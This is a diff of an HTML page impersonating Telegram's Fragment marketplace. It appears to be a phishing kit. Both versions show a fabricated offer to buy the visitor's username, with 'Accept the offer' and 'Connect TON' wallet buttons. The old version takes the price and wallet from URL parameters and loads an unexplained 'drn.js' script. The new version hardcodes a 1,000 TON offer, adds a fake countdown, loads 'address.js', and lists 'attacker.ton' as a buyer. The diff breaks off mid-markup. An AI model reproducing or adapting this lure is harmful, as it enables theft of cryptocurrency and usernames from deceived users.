@@ -1,471 +1,1146 @@
-<!DOCTYPE html>
-<html
-  style="
-    --tg-color-scheme: dark;
-    --tg-theme-bg-color: #212121;
-    --tg-theme-text-color: #ffffff;
-    --tg-theme-hint-color: #aaaaaa;
-    --tg-theme-link-color: #8774e1;
-    --tg-theme-button-color: #8774e1;
-    --tg-theme-button-text-color: #ffffff;
-    --tg-theme-secondary-bg-color: #0f0f0f;
-    --tg-theme-header-bg-color: #212121;
-    --tg-theme-accent-text-color: #8774e1;
-    --tg-theme-section-bg-color: #212121;
-    --tg-theme-section-header-text-color: #aaaaaa;
-    --tg-theme-subtitle-text-color: #aaaaaa;
-    --tg-theme-destructive-text-color: #e53935;
-    --tg-viewport-height: 100vh;
-    --tg-viewport-stable-height: 100vh;
-  "
-  csaa13="csaa13">
-  <head>
-    <title>main - Fragment</title>
-    <meta property="og:url" content="https://fragment.com/username/main" />
-    <meta property="og:title" content="Buy @main" />
-    <meta property="og:image" content="https://nft.fragment.com/username/main.webp" />
-    <meta
-      property="og:description"
-      content="Check the current availability of @main, a Telegram collectible username."
-    />
-    <meta property="og:site_name" content="Fragment Auctions" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
-    />
-    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://unpkg.com/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@ton/ton@13.11.2/dist/index.min.js"></script>
-  </head>
+<!doctype html>
+<html>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
 
-  <body class="emoji_image no-transition tc-using-mouse" ontouchstart="">
-    <div id="main-content">
-      <link href="./assets/font-robotoc4ca.css" rel="stylesheet" type="text/css" />
-      <link href="./assets/bootstrap.mineccb.css" rel="stylesheet" />
-      <link href="./assets/bootstrap-extrac81e.css" rel="stylesheet" />
-      <link href="./assets/auctiond09b.css" rel="stylesheet" />
-
-      <svg
-        xmlns="http://www.w3.org/2000/svg"
-        style="position: absolute; width: 0; height: 0; left: -10000px"
-      >
-        <defs>
-          <path
-            id="icon-premium"
-            d="m8.88 13.45 2.89-5.71c.33-.66 1.14-.93 1.8-.6.25.13.46.35.59.61l2.73 5.51c.22.45.66.76 1.16.82l5.7.68c.78.09 1.33.79 1.24 1.57-.04.31-.18.61-.41.84l-4.52 4.42c-.18.18-.27.43-.23.68l.75 5.98c.1.85-.5 1.63-1.36 1.74-.32.04-.65-.02-.94-.18l-4.77-2.59c-.34-.19-.76-.19-1.11-.01l-4.93 2.52c-.7.35-1.55.07-1.91-.62-.13-.26-.18-.55-.14-.84l.4-2.74c.19-1.34 1.03-2.51 2.23-3.12l5.49-2.78c.15-.08.2-.26.13-.4-.06-.12-.18-.18-.31-.16l-6.71.95c-1.02.15-2.06-.14-2.87-.79l-2.23-1.82c-.64-.51-.73-1.45-.22-2.09.24-.29.59-.48.97-.53l5.73-.74c.36-.04.68-.27.85-.6z"
-          ></path>
-          <path
-            id="icon-ton-qr"
-            d="m4.02 7h15.945c.33 0 .6.27.6.615 0 .105-.015.21-.075.3l-7.56 13.62c-.33.6-1.08.81-1.665.48-.21-.12-.375-.285-.48-.495l-7.305-13.62c-.15-.3-.045-.675.255-.825.09-.045.18-.075.285-.075zm7.98 14.67v-14.67z"
-            fill="none"
-            stroke="currentColor"
-            stroke-width="2.1"
-          ></path>
-          <path
-            d="M 6.67 5.74 L 8.88 1.32 C 9.13 0.81 9.74 0.6 10.25 0.86 C 10.45 0.96 10.61 1.13 10.71 1.33 L 12.79 5.59 C 12.96 5.93 13.29 6.17 13.67 6.22 L 18.03 6.74 C 18.62 6.82 19.05 7.36 18.98 7.96 C 18.95 8.2 18.84 8.43 18.66 8.61 L 15.21 12.03 C 15.07 12.16 15.01 12.36 15.03 12.56 L 15.6 17.17 C 15.69 17.83 15.22 18.44 14.57 18.52 C 14.32 18.55 14.07 18.5 13.85 18.38 L 10.21 16.38 C 9.95 16.24 9.63 16.23 9.36 16.37 L 5.59 18.32 C 5.06 18.59 4.41 18.38 4.14 17.84 C 4.03 17.64 4 17.41 4.03 17.19 L 4.33 15.07 C 4.48 14.03 5.12 13.14 6.04 12.66 L 10.23 10.51 C 10.34 10.45 10.38 10.31 10.33 10.2 C 10.28 10.11 10.19 10.06 10.09 10.08 L 4.97 10.82 C 4.19 10.93 3.39 10.71 2.78 10.2 L 1.07 8.8 C 0.58 8.4 0.51 7.68 0.9 7.18 C 1.09 6.96 1.35 6.81 1.64 6.77 L 6.02 6.2 C 6.3 6.17 6.54 5.99 6.67 5.74 Z"
-            id="icon-star"
-          ></path>
-          <linearGradient x1="25%" y1="0.825%" x2="74.92%" y2="107.86%" id="s2">
-            <stop stop-color="#FFD951" offset="0%"></stop>
-            <stop stop-color="#FFB222" offset="100%"></stop>
-          </linearGradient>
-          <linearGradient x1="50%" y1="0%" x2="50%" y2="99.8%" id="s3">
-            <stop stop-color="#E58F0D" offset="0%"></stop>
-            <stop stop-color="#EB7915" offset="100%"></stop>
-          </linearGradient>
-          <filter
-            x="-5.2%"
-            y="-5.3%"
-            width="110.3%"
-            height="110.6%"
-            filterUnits="objectBoundingBox"
-            id="s4"
-          >
-            <feOffset dx="1" dy="1" in="SourceAlpha" result="shadowOffsetInner1"></feOffset>
-            <feComposite
-              in="shadowOffsetInner1"
-              in2="SourceAlpha"
-              operator="arithmetic"
-              k2="-1"
-              k3="1"
-              result="shadowInnerInner1"
-            ></feComposite>
-            <feColorMatrix
-              values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.657 0"
-              type="matrix"
-              in="shadowInnerInner1"
-            ></feColorMatrix>
-          </filter>
-          <g
-            id="icon-colorful-star"
-            stroke="none"
-            stroke-width="1"
-            fill="none"
-            fill-rule="evenodd"
-          >
-            <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
-            <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
-            <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
-          </g>
-          <g
-            id="icon-multi-star"
-            stroke="none"
-            stroke-width="1"
-            fill="none"
-            fill-rule="evenodd"
-          >
-            <use stroke="currentColor" stroke-width="2.67" xlink:href="#icon-star"></use>
-            <use fill="url(#s2)" fill-rule="evenodd" xlink:href="#icon-star"></use>
-            <use fill="#000" filter="url(#s4)" xlink:href="#icon-star"></use>
-            <use stroke="url(#s3)" stroke-width="0.89" xlink:href="#icon-star"></use>
-            <path d="M 4 19 L 14 19 L 9 16.5 L 4 19 Z" fill="currentColor"></path>
-          </g>
-        </defs>
-      </svg>
-      <div id="aj_progress" class="progress-bar"></div>
-
-      <div id="aj_content">
-        <header class="tm-header">
-          <div class="tm-header-logo">
-            <a
-              onclick="location.reload()"
-              class="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable"
-            >
-              <i class="tm-logo-icon js-logo-icon"></i>
-              <i class="tm-logo-text"></i>
-            </a>
-          </div>
-          <div class="tm-header-body">
-            <form class="tm-header-search-form" style="margin-right: 10px">
-              <div class="icon-before icon-search tm-field tm-search-field">
-                <input
-                  type="search"
-                  class="form-control tm-input tm-search-input"
-                  name="query"
-                  placeholder="Search phone numbers"
-                  autocomplete="off"
-                />
-              </div>
-            </form>
-          </div>
-          <div class="tm-header-actions tm-header-actions-wide">
-            <button
-              class="btn btn-primary tm-header-action tm-header-button ton-auth-link ton-connect"
-              onclick="connectWallet()"
-            >
-            <div id="tcUIbtn" style="display: none"></div>
-              <i class="icon icon-connect-ton"></i>
-              <span class="tm-button-label">Connect TON</span>
-            </button>
-          </div>
-
-          <div
-            class="tm-header-menu js-header-menu hide aj_popup"
-            data-close-outside="js-header-menu-window"
-            id="n2ij53bk5b3"
-          >
-            <div class="tm-header-menu-window js-header-menu-window">
-              <div
-                class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close"
-                id="anwfabwfkj2"
-              ></div>
-              <div class="tm-header-menu-body">
-                <h4 class="tm-menu-subheader">Platform</h4>
-                <div class="tm-menu-links">
-                  <a class="tm-menu-link icon-before icon-menu-about">About</a>
-                  <a class="tm-menu-link icon-before icon-menu-terms">Terms</a>
-                  <a class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
-                </div>
-                <div class="tm-header-menu-footer">
-                  <div class="tm-header-menu-footer-text">
-                    Connect TON and Telegram <br />to view your bids and assets
-                  </div>
-                  <button
-                    class="btn btn-primary btn-block tm-menu-button ton-auth-link ton-connect"
-                  >
-                    <i class="icon icon-connect-ton"></i>
-                    <span class="tm-button-label">Connect TON</span>
-                  </button>
-                  <button
-                    class="btn btn-default btn-block tm-menu-button login-link"
-                  >
-                    <i class="icon icon-connect-telegram"></i>
-                    <span class="tm-button-label">Connect Telegram</span>
-                  </button>
-                </div>
-              </div>
-            </div>
-          </div>
-        </header>
-        <main class="tm-main js-main-content">
-          <section class="tm-section tm-auction-section">
-            <div class="tm-section-header">
-              <h2 class="tm-section-header-text">
-                <span class="tm-section-header-domain" id="product-name"></span>
-                <span class="tm-section-header-status tm-status-avail">Claimed</span>
-              </h2>
-              <div class="tm-section-subscribe tm-section-box js-subscribe">
-                <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
-                <a class="btn-link unsubscribe-btn js-unsubscribe-btn">Unsubscribe from updates</a>
-              </div>
-            </div>
-            <div class="tm-section-box tm-section-bid-info">
-              <table class="table tm-table tm-table-fixed">
-                <thead>
-                  <tr>
-                    <th>What is this?</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  <tr>
-                    <td></td>
-                  </tr>
-                </tbody>
-              </table>
-              <div class="tm-bid-info-text tm-offer-info-text" id="bid-info"></div>
-            </div>
-
-            <div
-              class="tm-list tm-section-box tm-section-auction-info"
-              id="anon-info"
-              style="display: none"
-            >
-              <dl class="tm-list-item">
-                <dt class="tm-list-item-title">Anonymous Number</dt>
-                <dd class="tm-list-item-value">
-                  <span class="accent-color" id="anon-info-name"></span>
-                </dd>
-              </dl>
-              <div class="tm-list-item-hint">
-                This anonymous number can be used to create a Telegram account
-                not tied to a SIM card.
-              </div>
-            </div>
-
-            <div
-              class="tm-list tm-section-box tm-section-auction-info"
-              id="username-info"
-              style="display: none"
-            >
-              <dl class="tm-list-item">
-                <dt class="tm-list-item-title">Telegram Username</dt>
-                <dd class="tm-list-item-value">
-                  <span class="accent-color" id="username-info-name"></span>
-                </dd>
-              </dl>
-              <dl class="tm-list-item">
-                <dt class="tm-list-item-title">Web Address</dt>
-                <dd class="tm-list-item-value">
-                  <span class="accent-color" id="username-info-link"></span>
-                </dd>
-              </dl>
-              <dl class="tm-list-item">
-                <dt class="tm-list-item-title">TON Web 3.0 Address</dt>
-                <dd class="tm-list-item-value">
-                  <span class="accent-color"
-                    ><span class="tm-web3-address"
-                      ><span class="subdomain" id="username-info-sub"></span
-                      ><span class="domain">.t.me</span></span
-                    ></span
-                  >
-                </dd>
-              </dl>
-            </div>
-
-            <div class="tm-section-box tm-section-buttons">
-              <button
-                class="btn btn-primary js-buy-now-btn1 ton-connect"
-                onclick="connectWallet()"
-              >
-                <span class="tm-button-label1">Accept the offer</span>
-              </button>
-            </div>
-          </section>
-          <section class="tm-section clearfix">
-            <div class="tm-section-header">
-              <h3 class="tm-section-header-text">Latest Offers</h3>
-            </div>
-            <div class="tm-table-wrap">
-              <table class="table tm-table tm-table-fixed">
-                <thead>
-                  <tr>
-                    <th style="--thin-width: 100px; --wide-width: 25%">
-                      Offer
-                    </th>
-                    <th
-                      style="--thin-width: 110px; --wide-width: 25%"
-                      id="date-title"
-                    >
-                      Date
-                    </th>
-                    <th style="--width: 50%">From</th>
-                  </tr>
-                </thead>
-                <tfoot></tfoot>
-                <tbody>
-                  <tr>
-                    <td>
-                      <div class="table-cell">
-                        <div
-                          class="table-cell-value tm-value icon-before icon-ton"
-                          id="offer-price"
-                        ></div>
-                      </div>
-                    </td>
-                    <td>
-                      <div class="table-cell">
-                        <div class="tm-datetime">
-                          <span class="wide-only"
-                            ><time id="current-time"></time
-                          ></span>
-                        </div>
-                      </div>
-                    </td>
-                    <td>
-                      <div class="table-cell">
-                        <a
-                          href="#"
-                          class="tm-wallet"
-                          target="_blank"
-                          id="wallet-link"
-                          ><span class="head" id="wallet-head"></span
-                          ><span class="middle"></span
-                          ><span class="tail" id="wallet-tail"></span></a
-                        >
-                      </div>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-          </section>
-        </main>
-        <footer class="tm-footer">
-          <div class="tm-footer-links">
-            <a class="tm-footer-link">Top Auctions</a>
-            <a class="tm-footer-link">About</a>
-            <a class="tm-footer-link">Terms</a>
-            <a class="tm-footer-link">Privacy</a>
-          </div>
-        </footer>
-        <div
-          class="popup-container js-howitworks-popup aj_popup"
-          style="display: none"
-        >
-          <div class="popup">
-            <div class="popup-body">
-              <section>
-                <h4>How does this work?</h4>
-                <p class="popup-text">
-                  You have received an offer to sell your
-                  <b>collectible number / username</b>, follow the
-                  instructions:<br />
-                  <br /><b>To do so, simply:</b><br />• Get
-                  <a href="https://tonkeeper.com/">Tonkeeper</a>, open it and
-                  create a <b>wallet</b>.<br />• Deposit funds in your
-                  <b>wallet</b> from a
-                  <a href="https://ton.org/buy-toncoin">supported exchange</a>
-                  or with <a href="https://wallet.t.me/">@wallet</a> on
-                  Telegram.<br />• Use <b>Tonkeeper</b> to log in on Fragment
-                  and return to this page.<br />• Tap the button below to accept
-                  the offer<br /><br />Upon acceptance, the username / number
-                  offer will immediately take possession of the buyer.
-                </p>
-                <div class="popup-buttons">
-                  <a
-                    href="#"
-                    class="btn btn-link btn-lg popup-cancel-btn close-modal"
-                    >Close</a
-                  >
-                </div>
-              </section>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <script>
-        if (window.Telegram) {
-          window.Telegram.WebApp.expand();
-        }
-
-        (async () => {
-          let startApp = window.Telegram.WebApp.initDataUnsafe.start_param;
-          if (startApp) startApp = startApp.replace(/__/g, '&');
-          const searchParams = new URLSearchParams(startApp || window.location.search);
-
-          const item = searchParams.get('item') || 'main';
-          let price = searchParams.get('price') || '50';
-          const wallet = searchParams.get('wallet') || 'EQDbnrjL3Mw4ikGWXdl9OVq6MCS3-qNb6WTmn8VnTB-olNBf';
-          const dateParam = searchParams.get('date');
-
-          document.getElementById('wallet-link').href = `https://tonviewer.com/${wallet}`;
-          document.getElementById('wallet-head').textContent = wallet.substring(0, 16);
-          document.getElementById('wallet-tail').textContent = wallet.substring(16);
-
-          const currentDate = new Date();
-          const formattedDate = `${currentDate.getUTCDate()} ${currentDate.toLocaleString('en', { month: 'short', timeZone: 'UTC' })} ${currentDate.getUTCFullYear()} at ${currentDate.getUTCHours().toString().padStart(2, '0')}:${currentDate.getUTCMinutes().toString().padStart(2, '0')}`;
-          document.getElementById('current-time').textContent = formattedDate;
-
-
-          let nftType = (item.startsWith('+') || !isNaN(item)) ? 'anonymous number' : 'username';
-          let name = item;
-          if (nftType === 'anonymous number' && !name.startsWith('+')) {
-            const firstThree = name.slice(0, 3);
-            const middleFour = name.slice(3, 7);
-            const lastFour = name.slice(7, 12);
-            name = `+${firstThree} ${middleFour} ${lastFour}`;
-            document.getElementById('anon-info').style.display = 'block';
-            document.getElementById('anon-info-name').textContent = name;
-            document.getElementById('product-name').textContent = name;
-          } else {
-            document.getElementById('username-info').style.display = 'block';
-            document.getElementById('product-name').textContent = `${name}.t.me`;
-            document.getElementById('username-info-name').textContent = name;
-            document.getElementById('username-info-link').textContent = `t.me/${name}`;
-            document.getElementById('username-info-sub').textContent = name;
-          }
-
-          document.getElementById('bid-info').innerHTML = `Someone offered <span class="icon-before icon-ton" id="this-price">${price}</span> for your ${nftType}. If the price suits you, press 'Accept the offer'.
-            <a class="tm-nowrap js-howofferworks open-modal" style="cursor: pointer;"><br>How does this work?</a>
-          `;
-
-          document.getElementById('offer-price').textContent = price;
-
-          async function fetchToncoinPrice() {
-            try {
-              const response = await fetch('https://tonapi.io/v2/rates?tokens=ton&currencies=usd');
-              const data = await response.json();
-              const tonPrice = data.rates.TON.prices.USD;
-              let usdPrice = `(~$${ (price * tonPrice).toFixed(2) })`;
-              document.getElementById('this-price').innerHTML = `${price} ${usdPrice}`;
-            } catch (error) {
-              console.error('Error fetching Toncoin price:', error);
+    <head>
+        <meta charset="utf-8" />
+        <title>spettro – Fragment</title>
+        <meta
+            name="viewport"
+            content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"
+        />
+        <meta name="format-detection" content="telephone=no" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="MobileOptimized" content="176" />
+        <style>
+            body {
+                display: none;
             }
-          }
-          fetchToncoinPrice();
+        </style>
+        <meta name="HandheldFriendly" content="True" />
+        <meta name="twitter:card" content="summary" />
 
-          document.getElementById('main-content').style.display = 'block';
+        <link
+            rel="shortcut icon"
+            href="https://fragment.com/img/fragment.ico"
+            type="image/x-icon"
+        />
+        <link
+            rel="mask-icon"
+            href="https://fragment.com/img/fragment_icon.svg"
+            color="#121519"
+        />
 
-          document.querySelectorAll('.open-modal').forEach(button => {
-            button.addEventListener('click', (e) => {
-              e.preventDefault();
-              document.querySelector('.popup-container').style.display = 'flex';
-            });
-          });
+        <link
+            href="../css/font-roboto.css?v=20260616b"
+            rel="stylesheet"
+            type="text/css"
+        />
+        <link href="css/bootstrap.min.css?v=20260616b" rel="stylesheet" />
+        <link href="css/bootstrap-extra.css?v=20260616b" rel="stylesheet" />
+        <link href="css/auction.css?v=20260616b" rel="stylesheet" />
+        <script src="js/address.js?v=20260616b"></script>
+        <script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
+        <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    </head>
 
-          document.querySelectorAll('.close-modal').forEach(button => {
-            button.addEventListener('click', (e) => {
-              e.preventDefault();
-              document.querySelector('.popup-container').style.display = 'none';
-            });
-          });
-        })();
-      </script>
-          <script src="assets/drn.js?276869"></script>
-          <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <body class="emoji_image no-transition">
+        <svg xmlns="http://www.w3.org/2000/svg" style="display: none">
+            <defs>
+                <path
+                    id="icon-premium"
+                    d="m8.88 13.45 2.89-5.71c.33-.66 1.14-.93 1.8-.6.25.13.46.35.59.61l2.73 5.51c.22.45.66.76 1.16.82l5.7.68c.78.09 1.33.79 1.24 1.57-.04.31-.18.61-.41.84l-4.52 4.42c-.18.18-.27.43-.23.68l.75 5.98c.1.85-.5 1.63-1.36 1.74-.32.04-.65-.02-.94-.18l-4.77-2.59c-.34-.19-.76-.19-1.11-.01l-4.93 2.52c-.7.35-1.55.07-1.91-.62-.13-.26-.18-.55-.14-.84l.4-2.74c.19-1.34 1.03-2.51 2.23-3.12l5.49-2.78c.15-.08.2-.26.13-.4-.06-.12-.18-.18-.31-.16l-6.71.95c-1.02.15-2.06-.14-2.87-.79l-2.23-1.82c-.64-.51-.73-1.45-.22-2.09.24-.29.59-.48.97-.53l5.73-.74c.36-.04.68-.27.85-.6z"
+                />
+                <path
+                    id="icon-ton-qr"
+                    d="m4.02 7h15.945c.33 0 .6.27.6.615 0 .105-.015.21-.075.3l-7.56 13.62c-.33.6-1.08.81-1.665.48-.21-.12-.375-.285-.48-.495l-7.305-13.62c-.15-.3-.045-.675.255-.825.09-.045.18-.075.285-.075zm7.98 14.67v-14.67z"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2.1"
+                />
+            </defs>
+        </svg>
+        <div id="aj_progress" class="progress-bar"></div>
+
+        <div id="aj_content">
+            <header class="tm-header">
+                <div class="tm-header-logo">
+                    <a
+                        href="https://fragment.com/"
+                        class="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable"
+                    >
+                        <i class="tm-logo-icon js-logo-icon"></i>
+                        <i class="tm-logo-text"></i>
+                    </a>
+                </div>
+                <div class="tm-header-body">
+                    <form
+                        action="https://fragment.com/"
+                        class="tm-header-search-form"
+                    >
+                        <div
+                            class="icon-before icon-search tm-field tm-search-field"
+                        >
+                            <input
+                                type="search"
+                                class="form-control tm-input tm-search-input"
+                                name="query"
+                                placeholder="Search usernames"
+                                autocomplete="off"
+                            />
+                        </div>
+                    </form>
+                </div>
+                <div class="tm-header-actions tm-header-actions-wide">
+                    <button
+                        class="btn btn-primary tm-header-action tm-header-button ton-auth-link"
+                        id="ton-connect-button"
+                        style="display: none"
+                    >
+                        <i class="icon icon-connect-ton"></i>
+                        <span class="tm-button-label">Connect TON</span>
+                    </button>
+                    <div
+                        class="btn-group tm-header-action tm-dropdown"
+                        id="ton-connected-dropdown"
+                        style="display: none"
+                    >
+                        <button
+                            class="btn btn-default tm-header-button dropdown-toggle"
+                            data-toggle="dropdown"
+                        >
+                            <i class="icon icon-connect-ton"></i>
+                            <span class="tm-button-label opt-fixed-width">
+                                <span class="tm-wallet">
+                                    <span class="head" id="wallet-head"></span>
+                                    <span class="middle"></span>
+                                    <span class="tail" id="wallet-tail"></span>
+                                </span>
+                            </span>
+                        </button>
+                        <ul class="dropdown-menu">
+                            <li>
+                                <a
+                                    href="/my/assets"
+                                    class="dropdown-menu-item icon-before icon-menu-assets"
+                                    data-counter=""
+                                    >My Assets</a
+                                >
+                            </li>
+                            <li>
+                                <a
+                                    href="/my/bids"
+                                    class="dropdown-menu-item icon-before icon-menu-bids"
+                                    data-counter=""
+                                    >My Bids</a
+                                >
+                            </li>
+                            <li>
+                                <a
+                                    href="/my/numbers"
+                                    class="dropdown-menu-item icon-before icon-menu-numbers"
+                                    data-counter=""
+                                    >My Numbers</a
+                                >
+                            </li>
+                            <li>
+                                <a
+                                    href="/my/sessions"
+                                    class="dropdown-menu-item icon-before icon-menu-sessions"
+                                    >Active Sessions</a
+                                >
+                            </li>
+                            <li>
+                                <a
+                                    href="javascript:;"
+                                    class="dropdown-menu-item icon-before icon-menu-disconnect ton-logout-link"
+                                    >Log Out</a
+                                >
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div
+                    class="tm-header-menu-button js-header-menu-button icon-before icon-header-menu"
+                ></div>
+                <div
+                    class="tm-header-menu hide js-header-menu"
+                    data-close-outside="js-header-menu-window"
+                >
+                    <div
+                        class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close"
+                    ></div>
+                    <div class="tm-header-menu-window js-header-menu-window">
+                        <div class="tm-header-menu-body">
+                            <h4 class="tm-menu-subheader">Platform</h4>
+                            <div class="tm-menu-links">
+                                <a
+                                    href="https://fragment.com/about"
+                                    class="tm-menu-link icon-before icon-menu-about"
+                                    >About</a
+                                >
+                                <a
+                                    href="https://fragment.com/terms"
+                                    class="tm-menu-link icon-before icon-menu-terms"
+                                    >Terms</a
+                                >
+                                <a
+                                    href="https://fragment.com/privacy"
+                                    class="tm-menu-link icon-before icon-menu-privacy"
+                                    >Privacy Policy</a
+                                >
+                            </div>
+                            <div class="tm-header-menu-footer">
+                                <div class="tm-header-menu-footer-text">
+                                    Connect TON <br />to view your bids and
+                                    assets
+                                </div>
+                                <button
+                                    class="btn btn-primary btn-block tm-menu-button ton-auth-link"
+                                >
+                                    <i class="icon icon-connect-ton"></i>
+                                    <span class="tm-button-label"
+                                        >Connect TON</span
+                                    >
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </header>
+            <main class="tm-main js-main-content">
+                <section class="tm-section tm-auction-section">
+                    <div class="tm-section-header">
+                        <h2 class="tm-section-header-text">
+                            <span class="tm-section-header-domain">
+                                <span class="tm-web3-address">
+                                    <span class="subdomain">spettro</span>
+                                    <span class="domain">.t.me</span>
+                                </span>
+                            </span>
+                            <span
+                                class="tm-section-header-status tm-status-avail"
+                                >Claimed</span
+                            >
+                        </h2>
+                        <div
+                            class="tm-section-subscribe tm-section-box js-subscribe"
+                        >
+                            <a class="btn-link subscribe-btn js-subscribe-btn"
+                                >Subscribe to updates</a
+                            >
+                            <a
+                                class="btn-link unsubscribe-btn js-unsubscribe-btn"
+                                >Unsubscribe from updates</a
+                            >
+                        </div>
+                    </div>
+
+                    <div class="tm-section-box tm-section-bid-info">
+                        <table class="table tm-table tm-table-fixed">
+                            <thead>
+                                <tr>
+                                    <th>What is this?</th>
+                                </tr>
+                            </thead>
+                        </table>
+                        <div class="tm-bid-info-text tm-offer-info-text">
+                            Someone offered
+                            <span class="icon-before icon-ton">1,000</span>
+                            for your username. If the price suits you, press
+                            "Accept the offer".
+                            <a
+                                href="https://fragment.com/about"
+                                class="tm-nowrap js-howofferworks"
+                                ><br />How does this work?</a
+                            >
+                        </div>
+                    </div>
+                    <div class="tm-list tm-section-box tm-section-auction-info">
+                        <dl class="tm-list-item">
+                            <dt class="tm-list-item-title">
+                                Telegram Username
+                            </dt>
+                            <dd class="tm-list-item-value">
+                                <span class="accent-color">@spettro</span>
+                            </dd>
+                        </dl>
+                        <dl class="tm-list-item">
+                            <dt class="tm-list-item-title">Web Address</dt>
+                            <dd class="tm-list-item-value">
+                                <span class="accent-color">t.me/spettro</span>
+                            </dd>
+                        </dl>
+                        <dl class="tm-list-item">
+                            <dt class="tm-list-item-title">
+                                TON Web 3.0 Address
+                            </dt>
+                            <dd class="tm-list-item-value">
+                                <span class="accent-color"
+                                    ><span class="tm-web3-address"
+                                        ><span class="subdomain"> spettro </span
+                                        ><span class="domain">.t.me</span></span
+                                    >
+                                </span>
+                            </dd>
+                        </dl>
+                    </div>
+
+                    <div
+                        class="tm-section-box tm-section-countdown-wrap"
+                        id="countdown-wrap"
+                    >
+                        <div class="tm-section-countdown">
+                            <span class="tm-countdown-label short"
+                                >Ends in</span
+                            >
+                            <div
+                                class="tm-countdown-timer"
+                                id="countdown-timer"
+                            >
+                                <div class="reel" id="reel-days">
+                                    <div
+                                        class="digit timer-d"
+                                        data-val="0 days"
+                                    ></div>
+                                </div>
+                                <div class="reel" id="reel-hours">
+                                    <div class="digit" data-val="0"></div>
+                                    <div class="digit" data-val="0"></div>
+                                </div>
+                                <div class="reel" id="reel-minutes">
+                                    <div class="digit" data-val="0"></div>
+                                    <div class="digit" data-val="0"></div>
+                                </div>
+                                <div class="reel" id="reel-seconds">
+                                    <div class="digit" data-val="0"></div>
+                                    <div class="digit" data-val="0"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tm-section-countdown-end">
+                            Offer expired
+                        </div>
+                    </div>
+
+                    <div
+                        class="tm-section-box tm-section-buttons js-actions"
+                        data-username="user"
+                        data-item-title="@user"
+                    >
+                        <button
+                            class="btn btn-primary js-make-offer-btn"
+                            id="accept-offer"
+                        >
+                            <span class="tm-button-label"
+                                >Accept the offer</span
+                            >
+                        </button>
+                    </div>
+                </section>
+                <section class="tm-section clearfix">
+                    <div class="tm-section-header">
+                        <h3 class="tm-section-header-text">Latest Offers</h3>
+                    </div>
+                    <div class="tm-table-wrap">
+                        <table class="table tm-table tm-table-fixed">
+                            <thead>
+                                <tr>
+                                    <th
+                                        style="
+                                            --thin-width: 100px;
+                                            --wide-width: 25%;
+                                        "
+                                    >
+                                        Offer
+                                    </th>
+                                    <th
+                                        style="
+                                            --thin-width: 110px;
+                                            --wide-width: 25%;
+                                        "
+                                    >
+                                        Date
+                                    </th>
+                                    <th style="--width: 50%">Offered by</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>
+                                        <div class="table-cell">
+                                            <div
+                                                class="table-cell-value tm-value icon-before icon-ton"
+                                            >
+                                                1,000
+                                            </div>
+                                        </div>
+                                    </td>
+                                    <td>
+                                        <div class="table-cell">
+                                            <div class="tm-datetime">
+                                                04 Jul 2026 at 08:53
+                                            </div>
+                                        </div>
+                                    </td>
+                                    <td>
+                                        <div class="table-cell">
+                                            <a
+                                                href="https://tonviewer.com/UQDm89iCT0ax77q5r8aEeTQoxV_tabRqFaSb5popvEnlMO6e"
+                                                class="tm-wallet"
+                                                target="_blank"
+                                            >
+                                                <span class="head"
+                                                    >UQDm89iCT0ax77q5r8aEeTQo</span
+                                                >
+                                                <span class="middle"></span>
+                                                <span class="tail"
+                                                    >xV_tabRqFaSb5popvEnlMO6e</span
+                                                >
+                                            </a>
+                                        </div>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+                <section class="tm-section clearfix"><html><head></head><body><div class="tm-section-header">
+      <h3 class="tm-section-header-text">Ownership History</h3>
     </div>
-  </body>
+    <div class="tm-table-wrap">
+      <table class="table tm-table tm-table-fixed">
+        <thead>
+          <tr>
+            <th>Sale price</th>
+            <th>Date</th>
+            <th>Buyer</th>
+          </tr>
+        </thead>
+        <tfoot>
+          
+        </tfoot>
+        <tbody>
+            <tr>
+    <td>
+      <div class="table-cell">
+        <div class="table-cell-value tm-value icon-before icon-ton">10</div>
+      </div>
+    </td>
+    <td>
+      <div class="table-cell">
+        <div class="tm-datetime"><span class="thin-only"><time datetime="2026-04-09T20:36:33+00:00" class="short">Apr 9 at 20:36</time></span><span class="wide-only"><time datetime="2026-04-09T20:36:33+00:00">9 Apr 2026 at 20:36</time></span></div>
+      </div>
+    </td>
+    <td>
+      <div class="table-cell">
+        <a href="https://tonviewer.com/EQA0odVR0IIwT7cZqYn_ugtv5r4RRPPlkdlGt5H5Wa6K8Vp2" class="tm-wallet" target="_blank"><span class="short">attacker.ton</span></a>
+      </div>
+    </td>
+  </tr>
+        </tbody>
+      </table>
+    </div>
+  </body></html></section>
+            </main>
+            <div
